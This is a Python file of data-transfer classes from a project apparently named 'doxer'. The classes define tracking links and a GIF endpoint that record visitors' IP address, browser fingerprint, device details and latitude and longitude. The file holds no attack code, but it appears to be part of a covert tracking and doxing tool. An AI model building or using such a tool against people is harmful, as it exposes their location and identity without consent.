from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from uuid import UUID

from doxer.domain.entities import UserData


@dataclass
class CreateUniqueLinkInputDTO:
    name: str

@dataclass
class CreateUniqueLinkOutputDTO:
    name: str
    token: str

@dataclass
class GenerateGifInputDTO:
    token: str
    screen_resolution: str
    color_depth: str
    current_url: str
    time_zone: str
    language: str
    platform: str
    network_type: str
    battery_status: str
    device_memory: str
    logical_processors: str
    local_datetime: str
    webgl_renderer: str
    client_ip: str
    user_agent: str
    name: Optional[str] = field(default=None)


@dataclass
class GenerateGifOutputDTO:
    gif_bytes: bytes
    user_data_id: UUID

@dataclass
class UserDataOutputDTO:
    id: UUID
    ip_address: str
    browser_info: dict[str, str]
    location: dict[str, str | float | None]
    system_info: dict[str, str]
    timestamp: datetime
    link_name: Optional[str]

    @staticmethod
    def from_entity(entity: UserData) -> 'UserDataOutputDTO':
        return UserDataOutputDTO(
            id=entity.id,
            ip_address=entity.ip_address,
            timestamp=entity.timestamp,
            link_name=entity.link_name,
            browser_info={
                "browser": entity.browser_data.browser,
                "os": entity.browser_data.os,
                "device": entity.browser_data.device,
            },
            location={
                "city": entity.location_data.city,
                "region": entity.location_data.region,
                "country": entity.location_data.country,
                "latitude": entity.location_data.latitude,
                "longitude": entity.location_data.longitude,
            },
            system_info={
                "screen_resolution": entity.js_data.screen_resolution,
                "color_depth": entity.js_data.color_depth,
                "current_url": entity.js_data.current_url,
                "time_zone": entity.js_data.time_zone,
                "language": entity.js_data.language,
                "platform": entity.js_data.platform,
                "network_type": entity.js_data.network_type,
                "battery_status": entity.js_data.battery_status,
                "device_memory": entity.js_data.device_memory,
                "logical_processors": entity.js_data.logical_processors,
                "local_datetime": entity.js_data.local_datetime,
                "webgl_renderer": entity.js_data.webgl_renderer,
            },
        )


@dataclass
class UserDataQueryDTO:
    name: str
